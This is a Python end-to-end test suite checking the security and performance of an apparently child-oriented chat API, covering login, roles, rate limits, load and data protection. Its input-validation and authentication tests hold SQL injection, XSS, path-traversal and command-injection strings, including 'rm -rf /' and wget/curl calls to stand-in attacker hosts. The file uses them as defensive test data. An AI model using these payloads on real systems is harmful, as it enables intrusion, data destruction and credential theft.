"""
E2E Tests for Security & Performance
===================================
Comprehensive end-to-end tests for security and performance:
- Authentication and authorization testing
- Rate limiting validation
- SQL injection and XSS protection
- Response time thresholds
- Load testing scenarios
- Security vulnerability testing
- Performance benchmarking
"""

import pytest
import asyncio
import time
import uuid
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from concurrent.futures import ThreadPoolExecutor
import statistics

from httpx import AsyncClient

from .base import E2ETestBase, E2ETestConfig, security_test, performance_test
from .utils import (
    validate_response,
    validate_error_response,
    generate_malicious_payloads,
    generate_large_payload,
    generate_auth_headers,
    retry_on_failure,
    PerformanceTimer
)


class SecurityPerformanceTests(E2ETestBase):
    """E2E tests for security and performance validation."""
    
    async def _custom_setup(self):
        """Setup for security and performance tests."""
        self.security_test_payloads = generate_malicious_payloads()
        
        self.performance_benchmarks = {
            "auth_login": 200.0,
            "user_registration": 500.0,
            "child_creation": 300.0,
            "message_processing": 1000.0,
            "dashboard_load": 800.0,
            "database_query": 50.0
        }
        
        self.load_test_config = {
            "concurrent_users": 10,
            "requests_per_user": 5,
            "ramp_up_time": 2.0
        }
        
        # Create test users for security testing
        self.test_users = {
            "admin": await self.data_manager.create_test_user(
                role="admin",
                username="security_test_admin"
            ),
            "parent": await self.data_manager.create_test_user(
                role="parent", 
                username="security_test_parent"
            ),
            "regular": await self.data_manager.create_test_user(
                role="user",
                username="security_test_user"
            )
        }
        
        # Create authenticated clients
        self.authenticated_clients = {}
        for role, user in self.test_users.items():
            client = await self.create_authenticated_client(user["username"])
            self.authenticated_clients[role] = client
    
    async def _custom_teardown(self):
        """Teardown for security and performance tests."""
        pass
    
    @security_test("authentication")
    async def test_authentication_security(self):
        """Test authentication security measures."""
        
        # Test 1: SQL Injection in login
        sql_injection_payloads = [
            "admin'; DROP TABLE users; --",
            "admin' OR '1'='1",
            "admin' UNION SELECT * FROM users --"
        ]
        
        for payload in sql_injection_payloads:
            response = await self.client.post(
                "/api/v1/auth/login",
                json={
                    "username": payload,
                    "password": "any_password"
                }
            )
            
            # Should not succeed with SQL injection
            assert response.status_code in [401, 422]
            
            # Verify error doesn't leak information
            error_data = response.json()
            assert "sql" not in error_data.get("message", "").lower()
            assert "database" not in error_data.get("message", "").lower()
        
        # Test 2: Brute force protection
        failed_attempts = 0
        user = self.test_users["regular"]
        
        # Attempt multiple failed logins
        for attempt in range(10):
            response = await self.client.post(
                "/api/v1/auth/login",
                json={
                    "username": user["username"],
                    "password": "wrong_password"
                }
            )
            
            if response.status_code == 429:  # Rate limited
                error_data = response.json()
                assert error_data["error"] == "too_many_attempts"
                assert "retry_after" in error_data
                break
            elif response.status_code == 401:
                failed_attempts += 1
            
            await asyncio.sleep(0.1)  # Small delay
        
        # Should be rate limited before 10 attempts
        assert failed_attempts < 10, "Brute force protection not working"
        
        # Test 3: Password strength validation
        weak_passwords = [
            "123456",
            "password",
            "abc123",
            "test",
            ""
        ]
        
        for weak_password in weak_passwords:
            response = await self.client.post(
                "/api/v1/auth/register",
                json={
                    "username": f"test_{uuid.uuid4().hex[:8]}",
                    "email": f"test_{uuid.uuid4().hex[:8]}@example.com",
                    "password": weak_password,
                    "role": "parent"
                }
            )
            
            assert response.status_code == 422
            error_data = response.json()
            assert error_data["error"] == "password_too_weak"
        
        # Test 4: JWT token security
        valid_user = self.test_users["parent"]
        
        # Get valid token
        response = await self.client.post(
            "/api/v1/auth/login",
            json={
                "username": valid_user["username"],
                "password": "test_password"
            }
        )
        
        auth_data = validate_response(response, 200)
        valid_token = auth_data["access_token"]
        
        # Test with modified token
        modified_token = valid_token[:-5] + "XXXXX"
        
        response = await self.client.get(
            "/api/v1/dashboard/overview",
            headers={"Authorization": f"Bearer {modified_token}"}
        )
        
        assert response.status_code == 401
        
        # Test with expired token (simulate)
        response = await self.client.post(
            "/api/v1/auth/logout",
            headers={"Authorization": f"Bearer {valid_token}"}
        )
        
        validate_response(response, 200)
        
        # Token should be invalid after logout
        response = await self.client.get(
            "/api/v1/dashboard/overview",
            headers={"Authorization": f"Bearer {valid_token}"}
        )
        
        assert response.status_code == 401
    
    @security_test("authorization")
    async def test_authorization_controls(self):
        """Test role-based authorization controls."""
        
        # Test 1: Regular user accessing admin endpoints
        regular_client = self.authenticated_clients["regular"]
        
        admin_endpoints = [
            "/api/v1/admin/users",
            "/api/v1/admin/system-stats",
            "/api/v1/admin/safety-reports",
            "/api/v1/admin/audit-logs"
        ]
        
        for endpoint in admin_endpoints:
            response = await regular_client.get(endpoint)
            assert response.status_code == 403
            
            error_data = response.json()
            assert error_data["error"] == "insufficient_permissions"
        
        # Test 2: Parent accessing other parent's children
        parent1_client = self.authenticated_clients["parent"]
        
        # Create another parent with child
        parent2 = await self.data_manager.create_test_user(role="parent")
        child2 = await self.data_manager.create_test_child(
            parent_id=uuid.UUID(parent2["id"]),
            parental_consent=True
        )
        
        # Parent 1 should not access Parent 2's child
        response = await parent1_client.get(
            f"/api/v1/children/{child2['id']}/conversations"
        )
        
        assert response.status_code == 403
        
        # Test 3: Child data access controls
        parent_client = self.authenticated_clients["parent"]
        
        # Create child for this parent
        parent = self.test_users["parent"]
        child = await self.data_manager.create_test_child(
            parent_id=uuid.UUID(parent["id"]),
            parental_consent=True
        )
        
        # Parent should access own child's data
        response = await parent_client.get(
            f"/api/v1/children/{child['id']}/profile"
        )
        
        validate_response(response, 200)
        
        # But not admin-only child operations
        response = await parent_client.delete(
            f"/api/v1/admin/children/{child['id']}/force-delete"
        )
        
        assert response.status_code == 403
    
    @security_test("input_validation")
    async def test_input_validation_security(self):
        """Test input validation against various attacks."""
        
        parent_client = self.authenticated_clients["parent"]
        parent = self.test_users["parent"]
        
        # Create child for testing
        child = await self.data_manager.create_test_child(
            parent_id=uuid.UUID(parent["id"]),
            parental_consent=True
        )
        
        # Test XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        for payload in xss_payloads:
            # Test in child name update
            response = await parent_client.put(
                f"/api/v1/children/{child['id']}/profile",
                json={"name": payload}
            )
            
            if response.status_code == 200:
                # If accepted, verify it's sanitized
                updated_data = response.json()
                assert "<script>" not in updated_data["name"]
                assert "javascript:" not in updated_data["name"]
                assert "onerror=" not in updated_data["name"]
            else:
                # Should be rejected
                assert response.status_code == 422
        
        # Test command injection in message content
        command_injection_payloads = [
            "; cat /etc/passwd",
            "| rm -rf /",
            "; wget http://malicious.com/malware",
            "&& curl http://evil.com"
        ]
        
        # Create conversation for testing
        response = await parent_client.post(
            f"/api/v1/children/{child['id']}/conversations",
            json={"title": "Security Test"}
        )
        
        conversation = validate_response(response, 201)
        
        for payload in command_injection_payloads:
            response = await parent_client.post(
                f"/api/v1/conversations/{conversation['id']}/messages",
                json={
                    "content": f"Hello {payload}",
                    "sender_type": "child"
                }
            )
            
            # Message should be processed safely or rejected
            if response.status_code == 201:
                message_data = response.json()
                # Ensure no command execution occurred
                assert "content_sanitized" in message_data
            else:
                assert response.status_code == 422
        
        # Test path traversal
        path_traversal_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%etc%2fpasswd"
        ]
        
        for payload in path_traversal_payloads:
            response = await parent_client.get(
                f"/api/v1/files/{payload}"
            )
            
            # Should not allow path traversal
            assert response.status_code in [400, 403, 404]
    
    @security_test("rate_limiting")
    @performance_test(threshold_ms=5000.0)
    async def test_rate_limiting_protection(self):
        """Test rate limiting protection mechanisms."""
        
        # Test 1: API endpoint rate limiting
        parent_client = self.authenticated_clients["parent"]
        
        # Test rate limiting on dashboard endpoint
        responses = []
        start_time = time.time()
        
        # Make rapid requests
        for i in range(50):
            response = await parent_client.get("/api/v1/dashboard/overview")
            responses.append(response.status_code)
            
            if response.status_code == 429:
                # Rate limited
                rate_limit_data = response.json()
                assert "retry_after" in rate_limit_data
                break
            
            # Small delay to avoid overwhelming
            await asyncio.sleep(0.05)
        
        # Should hit rate limit before 50 requests
        assert 429 in responses, "Rate limiting not working"
        
        # Test 2: Per-user rate limiting
        user_clients = []
        
        # Create multiple users
        for i in range(5):
            user = await self.data_manager.create_test_user(
                role="parent",
                username=f"rate_test_user_{i}"
            )
            client = await self.create_authenticated_client(user["username"])
            user_clients.append(client)
        
        # Each user should have independent rate limits
        async def test_user_rate_limit(client_index):
            client = user_clients[client_index]
            request_count = 0
            
            for _ in range(20):
                response = await client.get("/api/v1/dashboard/overview")
                if response.status_code == 200:
                    request_count += 1
                elif response.status_code == 429:
                    break
                await asyncio.sleep(0.1)
            
            return request_count
        
        # Test users concurrently
        user_request_counts = await asyncio.gather(*[
            test_user_rate_limit(i) for i in range(5)
        ])
        
        # Each user should be able to make some requests
        for count in user_request_counts:
            assert count > 0, "Per-user rate limiting too restrictive"
        
        # Test 3: Child safety endpoint rate limiting
        parent = self.test_users["parent"]
        child = await self.data_manager.create_test_child(
            parent_id=uuid.UUID(parent["id"]),
            parental_consent=True
        )
        
        # Create conversation
        response = await parent_client.post(
            f"/api/v1/children/{child['id']}/conversations",
            json={"title": "Rate Limit Test"}
        )
        
        conversation = validate_response(response, 201)
        
        # Test message rate limiting (more restrictive for child safety)
        message_responses = []
        
        for i in range(30):
            response = await parent_client.post(
                f"/api/v1/conversations/{conversation['id']}/messages",
                json={
                    "content": f"Test message {i}",
                    "sender_type": "child"
                }
            )
            
            message_responses.append(response.status_code)
            
            if response.status_code == 429:
                break
            
            await asyncio.sleep(0.1)
        
        # Child safety endpoints should have stricter limits
        rate_limited_index = next(
            (i for i, status in enumerate(message_responses) if status == 429),
            None
        )
        
        assert rate_limited_index is not None, "Child safety rate limiting not working"
        assert rate_limited_index < 20, "Child safety rate limiting too lenient"
    
    @performance_test(threshold_ms=10000.0)
    async def test_performance_benchmarks(self):
        """Test performance benchmarks for critical operations."""
        
        performance_results = {}
        
        # Test 1: Authentication performance
        auth_times = []
        
        for i in range(10):
            user = await self.data_manager.create_test_user(
                role="parent",
                username=f"perf_test_user_{i}"
            )
            
            async with PerformanceTimer("auth_login") as timer:
                response = await self.client.post(
                    "/api/v1/auth/login",
                    json={
                        "username": user["username"],
                        "password": "test_password"
                    }
                )
                
                validate_response(response, 200)
            
            auth_times.append(timer.duration_ms)
        
        avg_auth_time = statistics.mean(auth_times)
        performance_results["auth_login"] = {
            "average_ms": avg_auth_time,
            "max_ms": max(auth_times),
            "min_ms": min(auth_times),
            "threshold_ms": self.performance_benchmarks["auth_login"]
        }
        
        assert avg_auth_time <= self.performance_benchmarks["auth_login"], \
            f"Authentication too slow: {avg_auth_time}ms > {self.performance_benchmarks['auth_login']}ms"
        
        # Test 2: Child profile creation performance
        parent_client = self.authenticated_clients["parent"]
        parent = self.test_users["parent"]
        
        child_creation_times = []
        
        for i in range(5):
            child_data = {
                "name": f"Performance Test Child {i}",
                "estimated_age": 8,
                "parental_consent": True
            }
            
            async with PerformanceTimer("child_creation") as timer:
                response = await parent_client.post(
                    "/api/v1/children",
                    json=child_data
                )
                
                validate_response(response, 201)
            
            child_creation_times.append(timer.duration_ms)
        
        avg_child_creation_time = statistics.mean(child_creation_times)
        performance_results["child_creation"] = {
            "average_ms": avg_child_creation_time,
            "threshold_ms": self.performance_benchmarks["child_creation"]
        }
        
        assert avg_child_creation_time <= self.performance_benchmarks["child_creation"], \
            f"Child creation too slow: {avg_child_creation_time}ms"
        
        # Test 3: Dashboard loading performance
        dashboard_times = []
        
        for i in range(10):
            async with PerformanceTimer("dashboard_load") as timer:
                response = await parent_client.get("/api/v1/dashboard/overview")
                validate_response(response, 200)
            
            dashboard_times.append(timer.duration_ms)
        
        avg_dashboard_time = statistics.mean(dashboard_times)
        performance_results["dashboard_load"] = {
            "average_ms": avg_dashboard_time,
            "threshold_ms": self.performance_benchmarks["dashboard_load"]
        }
        
        assert avg_dashboard_time <= self.performance_benchmarks["dashboard_load"], \
            f"Dashboard loading too slow: {avg_dashboard_time}ms"
        
        # Log performance results
        self.logger.info(f"Performance benchmark results: {performance_results}")
    
    @performance_test(threshold_ms=30000.0)
    async def test_load_testing_scenarios(self):
        """Test system behavior under load."""
        
        # Test 1: Concurrent user registration
        async def register_user(user_index):
            user_data = {
                "username": f"load_test_user_{user_index}_{uuid.uuid4().hex[:4]}",
                "email": f"load_test_{user_index}_{uuid.uuid4().hex[:4]}@example.com",
                "password": "LoadTest123!",
                "role": "parent"
            }
            
            start_time = time.time()
            
            try:
                response = await self.client.post(
                    "/api/v1/auth/register",
                    json=user_data
                )
                
                duration_ms = (time.time() - start_time) * 1000
                
                return {
                    "user_index": user_index,
                    "success": response.status_code == 201,
                    "status_code": response.status_code,
                    "duration_ms": duration_ms
                }
            except Exception as e:
                duration_ms = (time.time() - start_time) * 1000
                return {
                    "user_index": user_index,
                    "success": False,
                    "error": str(e),
                    "duration_ms": duration_ms
                }
        
        # Run concurrent registrations
        concurrent_users = self.load_test_config["concurrent_users"]
        
        async with PerformanceTimer("concurrent_user_registration") as timer:
            registration_results = await asyncio.gather(*[
                register_user(i) for i in range(concurrent_users)
            ])
        
        # Analyze results
        successful_registrations = [r for r in registration_results if r["success"]]
        failed_registrations = [r for r in registration_results if not r["success"]]
        
        success_rate = len(successful_registrations) / len(registration_results)
        avg_registration_time = statistics.mean([r["duration_ms"] for r in successful_registrations])
        
        # Success rate should be high under load
        assert success_rate >= 0.8, f"Low success rate under load: {success_rate}"
        
        # Average time should still be reasonable
        assert avg_registration_time <= 2000.0, f"Registration too slow under load: {avg_registration_time}ms"
        
        # Test 2: Concurrent dashboard access
        # Use successful registrations to create authenticated clients
        auth_clients = []
        
        for result in successful_registrations[:5]:  # Limit for test performance
            try:
                # Login to get token
                login_response = await self.client.post(
                    "/api/v1/auth/login",
                    json={
                        "username": f"load_test_user_{result['user_index']}_{uuid.uuid4().hex[:4]}",
                        "password": "LoadTest123!"
                    }
                )
                
                if login_response.status_code == 200:
                    token = login_response.json()["access_token"]
                    client = AsyncClient(
                        base_url=self.config.base_url,
                        headers={"Authorization": f"Bearer {token}"}
                    )
                    auth_clients.append(client)
            except:
                continue  # Skip failed logins
        
        # Test concurrent dashboard access
        async def access_dashboard(client_index, client):
            start_time = time.time()
            
            try:
                response = await client.get("/api/v1/dashboard/overview")
                duration_ms = (time.time() - start_time) * 1000
                
                return {
                    "client_index": client_index,
                    "success": response.status_code == 200,
                    "status_code": response.status_code,
                    "duration_ms": duration_ms
                }
            except Exception as e:
                duration_ms = (time.time() - start_time) * 1000
                return {
                    "client_index": client_index,
                    "success": False,
                    "error": str(e),
                    "duration_ms": duration_ms
                }
        
        if auth_clients:
            dashboard_results = await asyncio.gather(*[
                access_dashboard(i, client) for i, client in enumerate(auth_clients)
            ])
            
            successful_dashboard_access = [r for r in dashboard_results if r["success"]]
            dashboard_success_rate = len(successful_dashboard_access) / len(dashboard_results)
            
            assert dashboard_success_rate >= 0.9, f"Dashboard access issues under load: {dashboard_success_rate}"
            
            # Cleanup auth clients
            for client in auth_clients:
                await client.aclose()
    
    @security_test("data_protection")
    async def test_data_protection_security(self):
        """Test data protection and privacy security measures."""
        
        parent_client = self.authenticated_clients["parent"]
        parent = self.test_users["parent"]
        
        # Create COPPA-protected child
        child = await self.data_manager.create_test_child(
            parent_id=uuid.UUID(parent["id"]),
            estimated_age=6,  # Under 13
            parental_consent=True
        )
        
        # Test 1: Data encryption verification
        response = await parent_client.get(
            f"/api/v1/children/{child['id']}/data-protection-status"
        )
        
        protection_status = validate_response(response, 200,
            required_fields=["encryption_enabled", "data_anonymized", "retention_policy"])
        
        assert protection_status["encryption_enabled"] is True
        assert protection_status["data_anonymized"] is True
        assert protection_status["retention_policy"]["coppa_compliant"] is True
        
        # Test 2: PII access controls
        # Create conversation with potential PII
        response = await parent_client.post(
            f"/api/v1/children/{child['id']}/conversations",
            json={"title": "PII Test Conversation"}
        )
        
        conversation = validate_response(response, 201)
        
        # Attempt to store PII
        pii_message = "My name is John Doe and I live at 123 Main Street"
        
        response = await parent_client.post(
            f"/api/v1/conversations/{conversation['id']}/messages",
            json={
                "content": pii_message,
                "sender_type": "child"
            }
        )
        
        # Should be blocked or sanitized
        if response.status_code == 422:
            error_data = response.json()
            assert error_data["error"] == "pii_detected"
        else:
            message_data = validate_response(response, 201)
            # If allowed, should be sanitized
            assert message_data["content_sanitized"] is True
            assert "John Doe" not in message_data["content"]
            assert "123 Main Street" not in message_data["content"]
        
        # Test 3: Data export controls
        response = await parent_client.get(
            f"/api/v1/children/{child['id']}/data-export"
        )
        
        export_data = validate_response(response, 200)
        
        # Verify data is properly anonymized in export
        assert "child_id_hash" in export_data
        assert "actual_child_name" not in export_data
        assert export_data.get("data_anonymized") is True
        
        # Test 4: Data deletion verification
        response = await parent_client.delete(
            f"/api/v1/children/{child['id']}/data",
            json={"confirmation": "DELETE_ALL_DATA"}
        )
        
        deletion_result = validate_response(response, 200,
            required_fields=["deletion_started", "estimated_completion"])
        
        assert deletion_result["deletion_started"] is True
        
        # Verify data access is blocked
        await asyncio.sleep(1)  # Give deletion time to process
        
        response = await parent_client.get(
            f"/api/v1/children/{child['id']}/profile"
        )
        
        # Should return 404 or indicate data deleted
        assert response.status_code in [404, 410]


# Test execution configuration
@pytest.mark.asyncio
@pytest.mark.e2e
@pytest.mark.security
@pytest.mark.performance
class TestSecurityPerformanceE2E:
    """Test class for running security and performance tests."""
    
    async def test_run_security_performance_tests(self):
        """Run all security and performance tests."""
        config = E2ETestConfig(
            enable_security_tests=True,
            max_response_time_ms=10000.0,
            enable_child_safety_tests=True
        )
        
        test_suite = SecurityPerformanceTests(config)
        
        try:
            await test_suite.setup()
            
            # Run all security and performance tests
            await test_suite.test_authentication_security()
            await test_suite.test_authorization_controls()
            await test_suite.test_input_validation_security()
            await test_suite.test_rate_limiting_protection()
            await test_suite.test_performance_benchmarks()
            await test_suite.test_load_testing_scenarios()
            await test_suite.test_data_protection_security()
            
        finally:
            await test_suite.teardown()


if __name__ == "__main__":
    # Direct execution for development/debugging
    asyncio.run(TestSecurityPerformanceE2E().test_run_security_performance_tests())